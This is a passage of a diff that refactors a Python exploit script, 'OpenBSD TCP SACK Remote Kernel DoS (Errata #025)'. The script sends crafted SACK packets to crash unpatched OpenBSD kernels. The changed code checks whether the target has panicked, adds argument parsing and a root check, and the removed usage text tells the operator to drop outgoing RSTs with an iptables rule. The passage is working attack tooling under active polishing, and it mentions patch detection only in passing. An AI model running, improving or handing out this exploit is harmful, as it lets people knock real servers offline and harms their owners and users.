-    print(f"    [+] Packet sent.")
-    print(f"        Block 1: [{block_normal[0]}, {block_normal[1]}]")
-    print(f"        Block 2: [0x{block_overflow[0]:08x}, {block_overflow[1]}]")
+    print(f'    [+] Sent.')
+    print(f'        Block 1: [{block_normal[0]}, {block_normal[1]}]')
+    print(f'        Block 2: [0x{block_overflow[0]:08x}, {block_overflow[1]}]')
 
     # ------------------------------------------------------------------
-    # Phase 4 — Verify the crash
+    # Phase 4 — Verify crash
     # ------------------------------------------------------------------
 
-    print("[4] Verifying target status...")
+    print('[4] Verifying...')
     time.sleep(3)
 
-    # Attempt to open a new TCP connection.
-    crashed = False
     try:
         probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         probe.settimeout(5)
         probe.connect((target, port))
         probe.close()
-        print("    [-] Target is responsive. Exploit did not succeed.")
-        print("        Possible explanations:")
-        print("        - Target is patched (errata #025 / #031 applied)")
-        print("        - Target is not OpenBSD (different TCP stack)")
-        print("        - SACK disabled on target (sysctl net.inet.tcp.sack=0)")
-    except Exception:
-        # Confirm with ICMP.
-        try:
-            result = subprocess.run(
-                ['ping', '-c', '2', '-W', '2', target],
-                capture_output=True, text=True, timeout=10)
-            if '0 received' in result.stdout or '100% packet loss' in result.stdout:
-                print("    [!] Target is unresponsive. Kernel panic confirmed.")
-                crashed = True
-            else:
-                print("    [?] TCP connection refused but host responds to ping.")
-                print("        The service may have crashed without a kernel panic.")
-        except Exception:
-            print("    [!] Target is unresponsive. Kernel panic likely.")
-            crashed = True
+        print('    [-] Target is responsive — not crashed.')
+        print('        Target may be patched, not OpenBSD, or SACK disabled.')
+        return False
+    except OSError:
+        pass
 
-    # Cleanup.
-    send_sock.close()
-    recv_sock.close()
+    if is_host_alive(target):
+        print('    [?] TCP refused but host pings — service crash, not kernel.')
+        return False
 
-    if rst_rule_added:
-        method, binary = rst_rule_added
-        print()
-        print(f"[*] Removing RST suppression rule ({method})...")
-        remove_rst_rule(target, method, binary)
-
-    return crashed
+    print('    [!] Target unresponsive — kernel panic.')
+    return True
 
 
 # ---------------------------------------------------------------------------
@@ -546,34 +593,39 @@ def exploit(target, port):
 # ---------------------------------------------------------------------------
 
 def main():
-    if len(sys.argv) < 2:
-        print("OpenBSD TCP SACK Remote Kernel DoS — Errata #025")
-        print()
-        print(f"Usage: python3 {sys.argv[0]} <target_ip> [port]")
-        print()
-        print("Prerequisites:")
-        print("  - Root privileges (raw sockets)")
-        print("  - Direct network path to target (not through NAT/proxy)")
-        print("  - Suppress outgoing RSTs to target:")
-        print("      iptables -A OUTPUT -p tcp --tcp-flags RST RST "
-              "-d <target> -j DROP")
-        print()
-        print("Patch detection (run on target):")
-        print("  syspatch -l | grep 025_sack")
-        sys.exit(1)
+    parser = argparse.ArgumentParser(
+        description='OpenBSD TCP SACK Remote Kernel DoS (Errata #025)',
+        epilog=(
+            'This exploit only affects unpatched OpenBSD systems. '
+            'Patch detection: syspatch -l | grep 025_sack'
+        ),
+    )
+    parser.add_argument('target', help='Target IPv4 address')
+    parser.add_argument('port', nargs='?', type=int, default=22,
+                        help='Target TCP port (default: 22)')
+    args = parser.parse_args()
 
-    target_ip = sys.argv[1]
-    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
+    # Basic input validation.
+    try:
+        socket.inet_aton(args.target)
+    except OSError:
+        parser.error(f'Invalid IPv4 address: {args.target}')
+    if not (1 <= args.port <= 65535):
+        parser.error(f'Invalid port: {args.port}')
 
-    crashed = exploit(target_ip, target_port)
+    # Privilege check.
+    if os.geteuid() != 0:
+        parser.error('Root privileges required (raw sockets).')
+
+    crashed = exploit(args.target, args.port)
 
     if crashed:
         print()
-        print("[*] The target kernel has panicked and requires a reboot.")
-        print("[*] Apply the fix: syspatch (installs errata #025)")
+        print('[*] Kernel panic confirmed. Target requires hard reboot.')
+        print('[*] Fix: syspatch (installs errata #025)')
 
-    sys.exit(0 if crashed else 1)
+    return 0 if crashed else 1
 
 
 if __name__ == '__main__':
-    main()
+    sys.exit(main())
